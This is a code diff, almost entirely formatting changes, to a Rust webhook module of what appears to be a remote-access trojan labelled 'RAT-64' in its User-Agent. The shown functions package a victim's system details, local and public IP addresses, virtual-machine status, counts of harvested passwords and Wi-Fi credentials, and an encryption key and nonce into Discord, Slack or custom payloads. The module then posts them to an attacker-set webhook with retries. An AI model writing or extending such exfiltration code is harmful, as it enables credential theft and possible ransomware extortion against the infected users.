@@ -1,5 +1,5 @@
 // Webhook送信モジュール
-use serde::{Serialize, Deserialize};
+use serde::{Deserialize, Serialize};
 use std::time::Duration;
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -33,7 +33,13 @@ impl Default for WebhookConfig {
 // send_webhook() と send_encryption_key_webhook() は統合版に統一
 
 /// システム情報と暗号化キーを一度にまとめて送信する統合Webhook関数
-pub fn send_unified_webhook(config: &WebhookConfig, system_info: &crate::SystemInfo, auth_data: &crate::AuthData, key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Box<dyn std::error::Error>> {
+pub fn send_unified_webhook(
+    config: &WebhookConfig,
+    system_info: &crate::SystemInfo,
+    auth_data: &crate::AuthData,
+    key: &[u8; 32],
+    nonce: &[u8; 12],
+) -> Result<(), Box<dyn std::error::Error>> {
     let webhook_url = match &config.webhook_url {
         Some(url) => url,
         None => return Ok(()),
@@ -44,9 +50,15 @@ pub fn send_unified_webhook(config: &WebhookConfig, system_info: &crate::SystemI
     let nonce_b64 = general_purpose::STANDARD.encode(nonce);
 
     let payload = match config.webhook_type {
-        WebhookType::Discord => create_discord_unified_payload(system_info, auth_data, &key_b64, &nonce_b64),
-        WebhookType::Slack => create_slack_unified_payload(system_info, auth_data, &key_b64, &nonce_b64),
-        WebhookType::Custom => create_custom_unified_payload(system_info, auth_data, &key_b64, &nonce_b64),
+        WebhookType::Discord => {
+            create_discord_unified_payload(system_info, auth_data, &key_b64, &nonce_b64)
+        }
+        WebhookType::Slack => {
+            create_slack_unified_payload(system_info, auth_data, &key_b64, &nonce_b64)
+        }
+        WebhookType::Custom => {
+            create_custom_unified_payload(system_info, auth_data, &key_b64, &nonce_b64)
+        }
         WebhookType::None => return Ok(()),
     };
 
@@ -58,17 +70,18 @@ pub fn send_unified_webhook(config: &WebhookConfig, system_info: &crate::SystemI
             .with_header("User-Agent", "RAT-64/1.0")
             .with_body(json_body.clone())
             .with_timeout(config.timeout_seconds)
-            .send() {
+            .send()
+        {
             if response.status_code >= 200 && response.status_code < 300 {
                 return Ok(());
             }
         }
-        
+
         if attempt < config.retry_attempts {
             std::thread::sleep(Duration::from_secs(2));
         }
     }
-    
+
     Err("統合Webhookの送信に失敗しました".into())
 }
 
@@ -91,11 +104,18 @@ fn now_timestamp() -> String {
 // 統合ペイロード関数のみを使用
 
 // 統合ペイロード作成関数（システム情報と暗号化キーを1つのペイロードにまとめて送信）
-fn create_discord_unified_payload(system_info: &crate::SystemInfo, auth_data: &crate::AuthData, key: &str, nonce: &str) -> serde_json::Value {
-    let auth_summary = format!("🔐パスワード: {}件
-📶Wi-Fi: {}件", 
+fn create_discord_unified_payload(
+    system_info: &crate::SystemInfo,
+    auth_data: &crate::AuthData,
+    key: &str,
+    nonce: &str,
+) -> serde_json::Value {
+    let auth_summary = format!(
+        "🔐パスワード: {}件
+📶Wi-Fi: {}件",
         auth_data.passwords.len(),
-        auth_data.wifi_creds.len());
+        auth_data.wifi_creds.len()
+    );
     let vm_status = if system_info.is_virtual_machine {
         match &system_info.virtual_machine_vendor {
             Some(v) if !v.is_empty() => v.as_str(),
@@ -106,10 +126,16 @@ fn create_discord_unified_payload(system_info: &crate::SystemInfo, auth_data: &c
     };
 
     let ip_info = match &system_info.public_ip {
-        Some(public_ip) => format!("🌐 ローカル: {}
-🌍 グローバル: {}", system_info.local_ip, public_ip),
-        None => format!("🌐 ローカル: {}
-🌍 グローバル: 取得失敗", system_info.local_ip),
+        Some(public_ip) => format!(
+            "🌐 ローカル: {}
+🌍 グローバル: {}",
+            system_info.local_ip, public_ip
+        ),
+        None => format!(
+            "🌐 ローカル: {}
+🌍 グローバル: 取得失敗",
+            system_info.local_ip
+        ),
     };
 
     serde_json::json!({
@@ -134,7 +160,12 @@ fn create_discord_unified_payload(system_info: &crate::SystemInfo, auth_data: &c
     })
 }
 
-fn create_slack_unified_payload(system_info: &crate::SystemInfo, auth_data: &crate::AuthData, key: &str, nonce: &str) -> serde_json::Value {
+fn create_slack_unified_payload(
+    system_info: &crate::SystemInfo,
+    auth_data: &crate::AuthData,
+    key: &str,
+    nonce: &str,
+) -> serde_json::Value {
     let public_ip_text = match &system_info.public_ip {
         Some(ip) => format!("グローバル: {}", ip),
         None => "グローバル: 取得失敗".to_string(),
@@ -171,7 +202,7 @@ fn create_slack_unified_payload(system_info: &crate::SystemInfo, auth_data: &cra
                 "type": "section",
                 "text": {
                     "type": "mrkdwn",
-                    "text": format!("*🔐 認証情報:* パスワード: {}件 | Wi-Fi: {}件\n*🔐 暗号化キー:*\n```\nKey: {}\nNonce: {}\n```\n⚠️  このキーは慎重に管理してください", 
+                    "text": format!("*🔐 認証情報:* パスワード: {}件 | Wi-Fi: {}件\n*🔐 暗号化キー:*\n```\nKey: {}\nNonce: {}\n```\n⚠️  このキーは慎重に管理してください",
                              auth_data.passwords.len(), auth_data.wifi_creds.len(), key, nonce)
                 }
             }
@@ -179,7 +210,12 @@ fn create_slack_unified_payload(system_info: &crate::SystemInfo, auth_data: &cra
     })
 }
 
-fn create_custom_unified_payload(system_info: &crate::SystemInfo, auth_data: &crate::AuthData, key: &str, nonce: &str) -> serde_json::Value {
+fn create_custom_unified_payload(
+    system_info: &crate::SystemInfo,
+    auth_data: &crate::AuthData,
+    key: &str,
+    nonce: &str,
+) -> serde_json::Value {
     serde_json::json!({
         "timestamp": std::time::SystemTime::now()
             .duration_since(std::time::UNIX_EPOCH)
